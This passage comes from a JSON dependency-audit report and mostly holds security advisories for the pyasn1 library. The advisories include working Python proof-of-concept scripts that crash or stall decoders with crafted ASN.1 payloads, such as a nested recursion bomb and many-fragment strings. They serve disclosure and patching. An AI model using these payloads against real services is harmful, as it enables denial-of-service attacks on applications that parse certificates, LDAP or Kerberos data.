version": "1.0.2", "vulns": []}, {"name": "deprecation", "version": "2.1.0", "vulns": []}, {"name": "pyasn1", "version": "0.4.8", "vulns": [{"id": "PYSEC-2026-2263", "fix_versions": ["0.6.3"], "aliases": ["GHSA-jr27-m4p2-rc6r", "CVE-2026-30922"], "description": "### Summary The `pyasn1` library is vulnerable to a Denial of Service (DoS) attack caused by uncontrolled recursion when decoding ASN.1 data with deeply nested structures. An attacker can supply a crafted payload containing nested `SEQUENCE` (`0x30`) or `SET` (`0x31`) tags with Indefinite Length (`0x80`) markers. This forces the decoder to recursively call itself until the Python interpreter crashes with a `RecursionError` or consumes all available memory (OOM), crashing the host application.  ### Details The vulnerability exists because the decoder iterates through the input stream and recursively calls `decodeFun` (the decoding callback) for every nested component found, without tracking or limiting the recursion depth. Vulnerable Code Locations: 1. `indefLenValueDecoder` (Line 998): ```for component in decodeFun(substrate, asn1Spec, allowEoo=True, **options):``` This method handles indefinite-length constructed types. It sits inside a `while True` loop and recursively calls the decoder for every nested tag.  2. `valueDecoder` (Lines 786 and 907): ```for component in decodeFun(substrate, componentType, **options):``` This method handles standard decoding when a schema is present. It contains two distinct recursive calls that lack depth checks: Line 786: Recursively decodes components of `SEQUENCE` or `SET` types. Line 907: Recursively decodes elements of `SEQUENCE OF` or `SET OF` types.  4. `_decodeComponentsSchemaless` (Line 661): ```for component in decodeFun(substrate, **options):``` This method handles decoding when no schema is provided.  In all three cases, `decodeFun` is invoked without passing a `depth` parameter or checking against a global `MAX_ASN1_NESTING` limit.  ### PoC ``` import sys from pyasn1.codec.ber import decoder  sys.setrecursionlimit(100000)  print(\"[*] Generating Recursion Bomb Payload...\") depth = 50_000 chunk = b'\\x30\\x80'  payload = chunk * depth  print(f\"[*] Payload size: {len(payload) / 1024:.2f} KB\") print(\"[*] Triggering Decoder...\")  try:     decoder.decode(payload) except RecursionError:     print(\"[!] Crashed: Recursion Limit Hit\") except MemoryError:     print(\"[!] Crashed: Out of Memory\") except Exception as e:     print(f\"[!] Crashed: {e}\") ```  ``` [*] Payload size: 9.77 KB [*] Triggering Decoder... [!] Crashed: Recursion Limit Hit ```  ### Impact - This is an unhandled runtime exception that typically terminates the worker process or thread handling the request. This allows a remote attacker to trivially kill service workers with a small payload (<100KB), resulting in a Denial of Service. Furthermore, in environments where recursion limits are increased, this leads to server-wide memory exhaustion. - Service Crash: Any service using `pyasn1` to parse untrusted ASN.1 data (e.g., LDAP, SNMP, Kerberos, X.509 parsers) can be crashed remotely. - Resource Exhaustion: The attack consumes RAM linearly with the nesting depth. A small payload (<200KB) can consume hundreds of megabytes of RAM or exhaust the stack.  ### Credits Vulnerability discovered by Kevin Tu of TMIR at ByteDance."}, {"id": "PYSEC-2026-2263", "fix_versions": ["0.6.3"], "aliases": ["GHSA-jr27-m4p2-rc6r", "CVE-2026-30922"], "description": "pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.3, the `pyasn1` library is vulnerable to a Denial of Service (DoS) attack caused by uncontrolled recursion when decoding ASN.1 data with deeply nested structures. An attacker can supply a crafted payload containing thousands of nested `SEQUENCE` (`0x30`) or `SET` (`0x31`) tags with \"Indefinite Length\" (`0x80`) markers. This forces the decoder to recursively call itself until the Python interpreter crashes with a `RecursionError` or consumes all available memory (OOM), crashing the host application. This is a distinct vulnerability from CVE-2026-23490 (which addressed integer overflows in OID decoding). The fix for CVE-2026-23490 (`MAX_OID_ARC_CONTINUATION_OCTETS`) does not mitigate this recursion issue. Version 0.6.3 fixes this specific issue."}, {"id": "PYSEC-2026-3456", "fix_versions": ["0.6.4"], "aliases": ["GHSA-8ppf-4f7h-5ppj", "CVE-2026-59885"], "description": "### Impact The BER/CER/DER decoders process OBJECT IDENTIFIER and RELATIVE-OID values in quadratic time relative to the number of arcs. A small crafted payload (tens of kilobytes) containing an OID with many arcs consumes seconds of CPU per decode() call, allowing denial of service in any application that decodes untrusted ASN.1 data (certificates, LDAP, SNMP, Kerberos, etc.). The corresponding encoders have the same quadratic behavior, reachable when an application re-encodes previously decoded attacker-supplied values.  The arc-size limit introduced for CVE-2026-23490 bounds the byte length of an individual arc but not the number of arcs, so it does not mitigate this issue.  ### Affected components ObjectIdentifierPayloadDecoder and RelativeOIDPayloadDecoder in pyasn1/codec/ber/decoder.py; ObjectIdentifierEncoder and RelativeOIDEncoder in pyasn1/codec/ber/encoder.py. The CER and DER codecs inherit these and are equally affected.  ### Patches Fixed in pyasn1 0.6.4: arc accumulation in both decoders and encoders now runs in linear time.  ### Workarounds Limit the size of untrusted ASN.1 input before decoding."}, {"id": "PYSEC-2026-3457", "fix_versions": ["0.6.4"], "aliases": ["CVE-2026-59886", "GHSA-hm4w-wwcw-mr6r"], "description": "### Impact The univ.Real type converted its (mantissa, base, exponent) value to a Python float using exact big-integer exponentiation. A BER/CER/DER-encoded REAL value only a few bytes long can carry a very large exponent, causing this computation to attempt to materialize an astronomically large integer.  Any operation that triggers float conversion on such a decoded value \u2014 prettyPrint(), str(), comparison, arithmetic, or an explicit float() call \u2014 consumes excessive CPU and memory, hanging the process. Applications that decode untrusted ASN.1 data and then print, log, or compare the decoded objects are vulnerable to denial of service. Decoding alone does not trigger the issue.  ### Affected components - pyasn1.type.univ.Real \u2014 float conversion (__float__() and everything built on it: prettyPrint(), str(), comparisons, arithmetic, int()) - Reachable through the pyasn1.codec.ber, cer, and der decoders, which produce Real objects from untrusted input; also via directly constructed Real values  The encoders and the native codec are not affected. Applications that never handle ASN.1 REAL values are not affected.  ### Patches Fixed in pyasn1 0.6.4. Binary (base-2) values are now converted with math.ldexp(), and decimal (base-10) values with exponents beyond float range raise OverflowError without constructing huge intermediate integers. Existing behavior is preserved: out-of-range values raise OverflowError and prettyPrint() renders them as <overflow>.  ### Workarounds Avoid converting, printing, or comparing decoded Real objects from untrusted sources; inspect the raw (mantissa, base, exponent) tuple instead."}, {"id": "PYSEC-2026-3457", "fix_versions": ["0.6.4"], "aliases": ["CVE-2026-59886", "GHSA-hm4w-wwcw-mr6r"], "description": "pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.4, the univ.Real type converted its mantissa, base, and exponent value to a Python float using exact big-integer exponentiation. A BER, CER, or DER encoded REAL value only a few bytes long can carry a very large exponent, causing float conversion through prettyPrint(), str(), comparison, arithmetic, int(), or an explicit float() call to consume excessive CPU and memory and hang applications that decode untrusted ASN.1 data and then print, log, or compare decoded objects. This issue is fixed in version 0.6.4."}, {"id": "PYSEC-2026-3456", "fix_versions": ["0.6.4"], "aliases": ["GHSA-8ppf-4f7h-5ppj", "CVE-2026-59885"], "description": "pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.4, the BER, CER, and DER decoders process OBJECT IDENTIFIER and RELATIVE-OID values in quadratic time relative to the number of arcs, so a small crafted payload containing an OID with many arcs consumes excessive CPU per decode() call and can deny service to applications that decode untrusted ASN.1 data. The corresponding encoders have the same quadratic behavior when an application re-encodes previously decoded attacker-supplied values. This issue is fixed in version 0.6.4."}, {"id": "PYSEC-2026-3455", "fix_versions": ["0.6.4"], "aliases": ["CVE-2026-59884", "GHSA-m4p7-r5rc-7g4j"], "description": "pyasn1 is a generic ASN.1 library for Python. Prior to 0.6.4, the BER decoder shared by the CER and DER codecs parses long-form tags by accumulating continuation octets without an upper bound on the tag ID size, allowing a crafted input to force construction of an arbitrarily large integer with CPU cost growing quadratically and to trigger unhandled ValueError exceptions in Python 3.11+ error formatting paths. Any application decoding untrusted BER, CER, or DER input is affected. This issue is fixed in version 0.6.4."}, {"id": "PYSEC-2026-3455", "fix_versions": ["0.6.4"], "aliases": ["CVE-2026-59884", "GHSA-m4p7-r5rc-7g4j"], "description": "### Impact The BER decoder (shared by the CER and DER codecs) parses long-form tags by accumulating continuation octets in a loop with no upper bound on the size of the tag ID. A crafted input can force the decoder to build an arbitrarily large integer, with CPU cost growing quadratically in input size \u2014 a ~1 MB input consumes over a minute of CPU. On Python 3.11+, the oversized tag ID can also trigger an unhandled `ValueError` (integer string conversion limit) while the decoder formats error messages, violating the documented `PyAsn1Error` contract and potentially bypassing caller error handling.  Any application decoding untrusted BER/CER/DER input is affected.  ### Affected components - `pyasn1.codec.ber.decoder` \u2014 `decode()` and `StreamingDecoder` - `pyasn1.codec.cer.decoder` and `pyasn1.codec.der.decoder`, which inherit   the same tag parsing - `pyasn1.type.tag` \u2014 `Tag`/`TagSet` reprs could raise `ValueError` when   rendering oversized tag IDs (reachable through decoder error paths)  The encoders and the `pyasn1.codec.native` codec are not affected.  ### Patches Fixed in 0.6.4. Long-form tag IDs are now limited to 20 octets (140-bit tag IDs, matching the existing OID arc limit); oversized tags are rejected with `PyAsn1Error`. Tag ID rendering in reprs and error messages was additionally hardened against the interpreter's integer-to-string conversion limit.  ### Workarounds Bound the size of untrusted input passed to `decode()` before calling it."}, {"id": "CVE-2026-119196", "fix_versions": ["0.6.5"], "aliases": ["GHSA-2qm8-x737-gmw5"], "description": "## Summary  In pyasn1 through 0.6.4, decoding a constructed BIT STRING with many fragments repeatedly shifts and copies the entire value accumulated so far. For fixed-size fragments, CPU time grows quadratically with the encoded input size. An application that passes sufficiently large, attacker-controlled ASN.1 data to an affected decoder can suffer CPU exhaustion during `decode()`; no conversion or formatting of the decoded value is required.  The BER and CER decoders reach this path for constructed BIT STRING values, with or without an `asn1Spec`. The DER decoder rejects constructed BIT STRING in schema-less decoding, but its schema-driven path accepts a **definite-length** constructed BIT STRING when given a matching `asn1Spec` and reaches the same vulnerable code. Constructed BIT STRING is not valid DER; this DER exposure is due to decoder permissiveness. DER rejects the indefinite-length form.  This is a separate decoder path from the OBJECT IDENTIFIER accumulation fixed in [CVE-2026-59885](https://github.com/advisories/GHSA-8ppf-4f7h-5ppj).  ## Technical details  In the 0.6.4 [`BitStringPayloadDecoder`](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L173-L301), both the [definite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L237-L255) and [indefinite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L275-L301) fragment loops call `BitString.fromOctetString(..., prepend=bitString)` for every fragment. [`fromOctetString`](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/type/univ.py#L614-L627) shifts the growing `SizedInteger` left by the fragment's bit length and ORs in the fragment. Shifting an ever-larger Python integer for each fixed-size fragment makes total work O(n\u00b2) for n fragments. The fragments are siblings, so the decoder's nesting-depth limit does not constrain their count; its limit on the number of length octets does not prevent the demonstrated inputs.  In 0.6.4, DER's [tag-driven map](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L15-L40) disables constructed BIT STRING, while its schema-driven type map retains the inherited decoder that permits it. This explains why a schema-less DER rejection is not a negative result for all DER decoding.  Under [X.690](https://www.itu.int/rec/T-REC-X.690-202102-I/en), a conforming CER constructed BIT STRING uses an indefinite-length outer encoding and primitive fragments with 1000 contents octets except possibly the last. That form reaches the affected indefinite-length loop. DER requires primitive string encoding, although the schema-driven pyasn1 decoder accepts the definite-length constructed example below.  ## Impact  An application is exposed when untrusted input can reach one of the affected decoder paths and its input limits admit enough fragments. The work occupies the decoding thread or worker and may cause denial of service. Whether the input is network-accessible or unauthenticated depends on the calling application. This advisory makes no claim that every application using pyasn1, or any particular protocol implementation, accepts such input.  ## Severity assessment (CVSS v3.1)  The 7.5 Base score assumes a reasonable application that automatically decodes attacker-supplied ASN.1 from unauthenticated network input. Valid BER and conforming CER values trigger the issue without special conditions, privileges, or user interaction. Repeated crafted values could occupy a finite decoder-worker pool and deny service while the attack continues. No confidentiality or integrity impact is demonstrated. This library-level score does not claim that every application is network-exposed or fully unavailable; deployment-specific input limits and architecture may change the score. See [FIRST's library-scoring guidance](https://www.first.org/cvss/v3-1/user-guide).  ## Reproducer  The definite-length example below is valid BER. It is deliberately not a conforming CER or DER encoding. The second constructor uses conforming CER fragment sizing and framing. CPU times are machine-dependent; run the larger cases only in a local test environment.  ```python import time  from pyasn1.codec.ber import decoder as ber_decoder from pyasn1.codec.cer import decoder as cer_decoder from pyasn1.codec.der import decoder as der_decoder from pyasn1.error import PyAsn1Error from pyasn1.type import univ   def encode_length(size):     octets = size.to_bytes((size.bit_length() + 7) // 8, \"big\")     return bytes((0x80 | len(octets),)) + octets   def definite_fragments(count):     body = b\"\\x03\\x02\\x00\\xa5\" * count  # one data octet per BIT STRING fragment     return b\"\\x23\" + encode_length(len(body)) + body   def cer_fragments(count):     # Each primitive fragment has 1000 contents octets: one unused-bits     # octet (zero) followed by 999 data octets.     fragment = b\"\\x03\" + encode_length(1000) + b\"\\x00\" + b\"\\xa5\" * 999     return b\"\\x23\\x80\" + fragment * count + b\"\\x00\\x00\"   def measure(label, decode, payload, **options):     start = time.process_time()     value, remainder = decode(payload, **options)     print(label, len(payload), f\"{time.process_time() - start:.3f}s CPU\")     assert not remainder and len(value) > 0   for count in (50_000, 100_000, 200_000):     measure(f\"BER {count} fragments\", ber_decoder.decode,             definite_fragments(count))  for count in (1_000, 2_000, 4_000):     measure(f\"CER {count} fragments\", cer_decoder.decode,             cer_fragments(count))  sample = definite_fragments(1_000) measure(\"DER with BIT STRING schema\", der_decoder.decode, sample,         asn1Spec=univ.BitString()) try:     der_decoder.decode(sample) except PyAsn1Error:     print(\"DER without schema rejects the constructed value\") else:     raise AssertionError(\"DER unexpectedly accepted schema-less input\") ```  ## Verification  Local measurements of the official v0.6.4 tag on CPython 3.14.8 used `time.process_time()`. A local 0.6.5 candidate containing the fix was timed on the same machine. Times are illustrative, not a guaranteed cost on other systems.  | Input | Size | v0.6.4 CPU | 0.6.5 candidate CPU | | --- | ---: | ---: | ---: | | BER definite, 50,000 fragments | 0.20 MB | 0.530 s | 0.084 s | | BER definite, 100,000 fragments | 0.40 MB | 1.915 s | 0.170 s | | BER definite, 200,000 fragments | 0.80 MB | 7.392 s | 0.344 s | | Conforming CER, 1,000 fragments | 1.004 MB | 0.163 s | 0.0035 s | | Conforming CER, 2,000 fragments | 2.008 MB | 0.657 s | 0.0070 s | | Conforming CER, 4,000 fragments | 4.016 MB | 2.582 s | 0.0144 s |  The definite BER input with 100,000 fragments also decoded through DER with `asn1Spec=univ.BitString()` in 1.949 s on v0.6.4, versus 0.172 s with the 0.6.5 candidate. Schema-less DER rejected the same input. Independent reports reproduced the old behavior on v0.6.4: one measured 21.1 s for a 1.28 MB definite-length value; another measured 7.25 s for a 0.8 MB value versus 2.8 ms for a primitive BIT STRING carrying the same data volume. These measurements were taken on different systems and should not be compared as a single benchmark series.  ## Resolution  Upgrade to pyasn1 0.6.5. The decoder assembles fragment bits in a `bytearray`, preserves decoded bit values including intermediate-fragment padding, and converts the complete payload to a BIT STRING once. This removes the repeated shift of the growing integer in both constructed decoding loops.  For applications that cannot upgrade immediately, enforce an application-appropriate limit on untrusted ASN.1 input size **before** passing it to pyasn1. Such a limit bounds exposure but does not change the quadratic behavior of 0.6.4. Where a protocol forbids constructed BIT STRING, rejecting that encoding before decoding also prevents this path."}, {"id": "CVE-2026-119194", "fix_versions": ["0.6.5"], "aliases": ["GHSA-fm9c-5rcf-2q5p"], "description": "### Summary  When an application decodes attacker-controlled BER, CER, or DER data without an ASN.1 schema, a container with many distinct long tag IDs can cause quadratic CPU use. Repeated inputs can exhaust CPU and reduce service availability.  ### Details  ConstructedPayloadDecoderBase._decodeComponentsSchemaless inserts every decoded component\u2019s TagSet into a growing set, although it only needs to distinguish one tag set from two or more. Attacker-chosen tag IDs can have colliding TagSet hashes, making each later insertion compare against an increasing number of earlier tags. This path is present in v0.6.4 and is inherited by the CER and DER decoders. The proposed fix stops growing the classification set after it contains two distinct tag sets, while retaining every decoded component and its order.  On v0.6.4 with CPython 3.12.10, increasing the collision input from 3,200 to 6,400 components raised decode CPU time from 0.438 to 1.747 seconds; a comparable control rose from 0.031 to 0.065 seconds. Both inputs decoded successfully with the expected values and an empty remainder.  ### Proof of concept  Run this outside the repository checkout in a fresh Python 3.12 environment with pyasn1==0.6.4 installed:  ```python import sys import time  from pyasn1.codec.ber import decoder from pyasn1.type import univ   def enc_tag(tag_id):     groups = [tag_id & 0x7f]     tag_id >>= 7     while tag_id:         groups.append((tag_id & 0x7f) | 0x80)         tag_id >>= 7     return b'\\xbf' + bytes(reversed(groups))   def payload(tag_ids):     body = b''.join(enc_tag(tag_id) + b'\\x03\\x04\\x01A'                     for tag_id in tag_ids)     length = len(body).to_bytes((len(body).bit_length() + 7) // 8, 'big')     return b'\\x30' + bytes([0x80 | len(length)]) + length + body   for count in (3200, 6400):     cases = (         (\"collision\", [32 + i * sys.hash_info.modulus                        for i in range(count)]),         (\"control\", [(1 << 70) + i for i in range(count)]),     )     for name, tag_ids in cases:         wire = payload(tag_ids)         start = time.process_time()         value, remainder = decoder.decode(wire)         cpu_seconds = time.process_time() - start          assert type(value) is univ.Sequence         assert len(value) == count and remainder == b''         for position, tag_id in enumerate(tag_ids):             component = value.getComponentByPosition(position)             assert component.asOctets() == b'A'             assert component.tagSet[-1].tagId == tag_id          print(count, name, len(wire), round(cpu_seconds, 3)) ```  ### Impact  Applications that pass attacker-controlled bytes to schemaless BER, CER, or DER decoding can spend disproportionate CPU time on a relatively small, valid input. The demonstrated impact is availability; no confidentiality or integrity impact was observed."}, {"id": "CVE-2026-119197", "fix_versions": ["0.6.5"], "aliases": ["GHSA-mm57-4v3p-rchx"], "description": "## Summary  In pyasn1 0.6.4 and earlier, decoding a binary-encoded ASN.1 REAL with a large mantissa can consume CPU time quadratic in the mantissa length. The BER, CER, and DER decoders all use the affected `RealPayloadDecoder`. An application is exposed when it passes attacker-controlled ASN.1 containing a REAL value to one of these decoders, either without an `asn1Spec` or with a schema that includes REAL. The work occurs inside `decode()`; the application does not need to convert, print, or otherwise use the resulting REAL object.  This is distinct from [CVE-2026-59886](https://github.com/advisories/GHSA-hm4w-wwcw-mr6r), which concerns converting an already-decoded REAL to a Python float. That issue was fixed in 0.6.4 and its advisory states that decoding alone does not trigger it.  ## Root cause and affected components  For binary REAL values, [`RealPayloadDecoder.valueDecoder` in v0.6.4](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L535-L603) builds the mantissa one octet at a time:  ```python p = 0 while chunk:     p <<= 8     p |= chunk[0]     chunk = chunk[1:] ```  Each shift processes an integer that grows with the mantissa; with byte strings, each slice also copies the remaining suffix. Repeating both operations for every octet makes decoding quadratic in mantissa size. The decoder's [eight-octet length-field limit](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L1704-L1717) does not impose a practical mantissa-size limit for the inputs demonstrated below. [CER](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/cer/decoder.py#L51-L62) and [DER](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L23-L31) reuse the BER REAL payload decoder, so all three paths reach this loop.  The vulnerable loop is present in every available repository release tag inspected, from v0.2.1 through v0.6.4. Runtime measurements below were made on v0.6.4; older releases were checked for the loop, not benchmarked individually.  ## Impact  A comparatively small REAL value can hold a decoder worker on one CPU core for seconds or longer. The attacker must be able to supply data that the application sends to an affected decoder, and application-level input limits may reduce exposure. The demonstrated effect is CPU exhaustion during decoding; this advisory does not assert a network endpoint, unauthenticated access, or an affected downstream application by itself.  ## Reproduction and evidence  The following example uses pyasn1 0.6.4. The `0x09` tag identifies REAL; `0x80 0x00` selects a positive, base-2 binary value with a one-octet zero exponent, followed by a large mantissa. It exercises `decode()` only.  ```python import time  from pyasn1.codec.ber import decoder as ber from pyasn1.codec.cer import decoder as cer from pyasn1.codec.der import decoder as der   def real_value(mantissa_octets):     content = b\"\\x80\\x00\" + b\"\\xff\" * mantissa_octets     length = len(content).to_bytes(3, \"big\")     return b\"\\x09\\x83\" + length + content   for codec in (ber, cer, der):     for size in (50_000, 100_000, 200_000):         substrate = real_value(size)         started = time.process_time()         value, rest = codec.decode(substrate)         print(codec.__name__, size, time.process_time() - started)         assert not rest         assert tuple(value)[1:] == (2, 0) ```  The original report measured the following BER CPU times on repository commit `aa05757`. That commit is later than the official v0.6.4 tag; the vulnerable loop is identical in the tagged release.  | Mantissa size | Reporter's BER CPU time | | ---: | ---: | | 50,000 octets | 0.328 s | | 100,000 octets | 1.299 s | | 200,000 octets | 6.043 s | | 400,000 octets | 24.095 s |  The same report measured 5.645 s for a 200,000-octet mantissa through DER.  A separate local reproduction on the official v0.6.4 tag (`d43496f`, CPython 3.14.8, macOS arm64) measured BER at 0.209 s, 0.884 s, and 3.451 s for 50,000, 100,000, and 200,000 mantissa octets respectively. CER and DER each took about 0.89 s at 100,000 octets. These are machine-specific measurements; the repeated near-fourfold cost for doubled input is the relevant result. Neither reproduction calls `float()`, `str()`, or `prettyPrint()`.  ## Fix  pyasn1 0.6.5 replaces the per-octet shift and slice loop with one `int.from_bytes(bytes(chunk), \"big\")` conversion. Sign, scale, exponent, and the decoded REAL tuple are preserved. The fix is in the shared BER payload decoder and therefore covers BER, CER, and DER. A local check of the 0.6.5 candidate decoded a 200,000-octet mantissa correctly through all three codecs; the check does not establish behavior for every application using REAL.  ## Workarounds  Upgrade to pyasn1 0.6.5. Until then, reject or strictly limit attacker-controlled ASN.1 input that may contain REAL values before passing it to pyasn1. The appropriate size limit depends on the application's available CPU time and request volume."}, {"id": "CVE-2026-119195", "fix_versions": ["0.6.5"], "aliases": ["GHSA-9m75-vc3g-4x39"], "description": "## Summary  In pyasn1 0.6.4 and earlier, decoding a constructed OCTET STRING or character string made of many fragments can spend disproportionate CPU time repeatedly copying the accumulated value. A separate indefinite-length `ANY` path has the same problem while collecting the encoded components. The work grows roughly quadratically with the number of fixed-size fragments, although the input and decoded value grow linearly. An application that lets an attacker supply such ASN.1 input to an affected decoder can suffer CPU exhaustion.  The affected string paths are available in BER and CER. The DER decoder also accepts certain *non-DER* constructed strings: a definite-length constructed OCTET STRING when an `asn1Spec` selects `univ.OctetString`, and constructed character strings such as UTF8String even without a schema. Indefinite-length `ANY` is affected in BER and CER when an `asn1Spec` selects `univ.Any`; DER rejects indefinite lengths.  This is a distinct decoder path from the OBJECT IDENTIFIER/RELATIVE-OID accumulation addressed by [CVE-2026-59885](https://github.com/advisories/GHSA-8ppf-4f7h-5ppj). It has the same complexity class, but the OID fix in 0.6.4 did not change these string or `ANY` loops.  ## Technical details  In the [v0.6.4 BER decoder](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py), `OctetStringPayloadDecoder` appends each decoded fragment to a growing `bytes` value with `header += component` in both its [definite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L338-L351) and [indefinite-length](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L368-L387) constructed forms. [`AnyPayloadDecoder.indefLenValueDecoder`](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py#L1403-L1430) similarly uses `chunk += component`. In the exercised paths, each concatenation copies an increasingly large prefix. For `N` fixed-size fragments, the total copied data grows with `1 + 2 + ... + N`, or O(N\u00b2).  The OCTET STRING decoder is also the base class of the decoders for UTF8String, NumericString, PrintableString, TeletexString, VideotexString, IA5String, GraphicString, VisibleString, GeneralString, UniversalString, BMPString, ObjectDescriptor, GeneralizedTime, and UTCTime. These types inherit the same constructed-string reassembly path.  The [DER decoder's OCTET STRING restriction](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/der/decoder.py#L15-L49) replaces the tag-driven decoder, but its schema-driven `TYPE_MAP` retains the BER-derived decoder. Thus `der.decode(data)` rejects a constructed OCTET STRING, while `der.decode(data, asn1Spec=univ.OctetString())` accepts its definite-length form and reaches the accumulation loop. DER does not replace the inherited character-string decoders, so a constructed UTF8String is also accepted without `asn1Spec`. These inputs violate [X.690's DER string-encoding rule](https://www.itu.int/rec/T-REC-X.690-202102-I/en) and should not be described as valid DER encodings.  The original short-fragment, definite-length OCTET STRING reproducer is valid BER. The CER decoder accepts it, but it is not a conforming CER string encoding: X.690 requires an indefinite-length outer constructed string and 1,000 contents octets per fragment except possibly the last. A conforming CER-shaped constructed OCTET STRING with those fragment sizes also reaches the loop and shows quadratic growth. The indefinite-length `ANY` reproducer below can represent a CER `SEQUENCE OF OCTET STRING` and reaches the separate `ANY` loop when decoded with an `ANY` schema.  The decoder's eight-octet length-field limit and nesting-depth limit do not bound the number of sibling fragments in these examples. The BER reproducer below uses only a three-octet outer length field; all fragments have shallow nesting. There is no per-message fragment-count cap in v0.6.4.  ## Impact  If an application passes attacker-controlled ASN.1 to the affected `decode()` or `StreamingDecoder` path without an adequate input or resource limit, a megabyte-scale value can occupy a decoding worker for seconds. Repeated inputs can exhaust available CPU. Whether this is reachable before authentication, or through a particular protocol, depends on the application; the library finding alone does not establish those conditions. No confidentiality or integrity impact is claimed.  ## Severity assessment (CVSS v3.1)  The 7.5 Base score assumes a reasonable application that automatically decodes attacker-supplied ASN.1 from unauthenticated network input. Valid BER and conforming CER inputs trigger the string-reassembly issue without special conditions, privileges, or user interaction. Repeated crafted inputs could occupy all available decoder workers and deny service while the attack continues. No confidentiality or integrity impact is demonstrated. This library-level score does not assert that every adopter has such an endpoint or loses all service; deployment-specific input limits and architecture may change the score. See [FIRST's library-scoring guidance](https://www.first.org/cvss/v3-1/user-guide).  On the official v0.6.4 tag, local CPU-time measurements with CPython 3.14.8 on macOS arm64 gave the following results. Times vary by machine and Python runtime; the input-size scaling is the relevant observation. \u201cFixed\u201d means the local 0.6.5 decoder fix applied to the same inputs.  | Decoder path and input | Fragments | v0.6.4 CPU | Fixed CPU | | --- | ---: | ---: | ---: | | BER constructed OCTET STRING, 0.40 MB | 100,000 \u00d7 2 payload bytes | 0.340 s | 0.160 s | | BER constructed OCTET STRING, 0.80 MB | 200,000 \u00d7 2 payload bytes | 0.886 s | 0.312 s | | BER constructed OCTET STRING, 1.60 MB | 400,000 \u00d7 2 payload bytes | 2.738 s | 0.623 s | | BER indefinite `ANY`, 0.30 MB | 100,000 \u00d7 1 payload byte | 0.459 s | 0.206 s | | BER indefinite `ANY`, 0.60 MB | 200,000 \u00d7 1 payload byte | 1.245 s | 0.412 s | | BER indefinite `ANY`, 1.20 MB | 400,000 \u00d7 1 payload byte | 3.980 s | 0.826 s | | CER constructed OCTET STRING, 1.00 MB, conforming fragment layout | 1,000 \u00d7 1,000 payload bytes | 0.0089 s | 0.0022 s | | CER constructed OCTET STRING, 2.01 MB, conforming fragment layout | 2,000 \u00d7 1,000 payload bytes | 0.0311 s | 0.0044 s | | CER constructed OCTET STRING, 4.02 MB, conforming fragment layout | 4,000 \u00d7 1,000 payload bytes | 0.1379 s | 0.0090 s |  For the same short-fragment layout, the original report measured up to 16.05 seconds for a 3.2 MB BER constructed OCTET STRING. An independent report on CPython 3.11.16/Linux measured 5.76 seconds for a 2.4 MB constructed OCTET STRING, versus about 0.005 seconds for a primitive OCTET STRING of comparable size. These are reporter measurements on different systems, not fixed performance guarantees.  ## Reproduction  This example uses public decoder APIs. Run it with pyasn1 0.6.4 and increase `n` to observe the scaling. The final two calls show the DER paths accepted by v0.6.4; their constructed encodings are not valid DER.  ```python import time  from pyasn1.codec.ber import decoder as ber from pyasn1.codec.cer import decoder as cer from pyasn1.codec.der import decoder as der from pyasn1.type import univ   def tlv(identifier, contents):     length = len(contents)     if length < 128:         return bytes((identifier, length)) + contents     encoded = length.to_bytes((length.bit_length() + 7) // 8, \"big\")     return bytes((identifier, 0x80 | len(encoded))) + encoded + contents   def measure(label, decode, substrate, asn1Spec=None):     start = time.process_time()     _, rest = decode(substrate, asn1Spec=asn1Spec)     assert not rest     print(f\"{label}: {len(substrate)} input bytes, \"           f\"{time.process_time() - start:.3f} CPU seconds\")   n = 100_000 octet_fragments = b\"\\x04\\x02AA\" * n utf8_fragments = b\"\\x0c\\x02AA\" * n  measure(\"BER constructed OCTET STRING\", ber.decode,         tlv(0x24, octet_fragments)) measure(\"BER indefinite ANY\", ber.decode,         b\"\\x30\\x80\" + b\"\\x04\\x01A\" * n + b\"\\x00\\x00\",         univ.Any())  # CER uses indefinite length and 1,000-content-octet primitive fragments. cer_fragment = tlv(0x04, b\"A\" * 1000) measure(\"CER constructed OCTET STRING\", cer.decode,         b\"\\x24\\x80\" + cer_fragment * 1000 + b\"\\x00\\x00\")  # These constructed encodings are accepted by pyasn1 but are invalid DER. measure(\"DER OCTET STRING with schema\", der.decode,         tlv(0x24, octet_fragments), univ.OctetString()) measure(\"DER UTF8String without schema\", der.decode,         tlv(0x2c, utf8_fragments)) ```  ## Patch  pyasn1 0.6.5 replaces the growing `bytes` accumulator with a list of fragments and joins them once after decoding in all three affected loops. The OCTET STRING base-class change also covers the inheriting character-string decoders. This removes the repeated copying while preserving the assembled decoded value.  ## Workaround  Until upgrading, enforce application-appropriate limits on the size of untrusted ASN.1 input *before* passing it to pyasn1, and limit the CPU resources available to decoding workers. Applications that require DER can also reject constructed string encodings before invoking the decoder. The appropriate byte limit depends on the protocol and expected valid values.  ## Credits and references  Reported by [alimony](https://github.com/alimony). Independently reported by [manus-pi](https://github.com/manus-pi), whose report identified the schema-driven DER route, inherited character-string decoders, and additional performance evidence.  - [pyasn1 v0.6.4 affected decoder source](https://github.com/pyasn1/pyasn1/blob/v0.6.4/pyasn1/codec/ber/decoder.py) - [ITU-T X.690, CER and DER string-encoding rules](https://www.itu.int/rec/T-REC-X.690-202102-I/en) - [CVE-2026-59885, separate OID decoder issue](https://github.com/advisories/GHSA-8ppf-4f7h-5ppj)"}]}, {"name": "pyjwt", "version": "2.15.1", 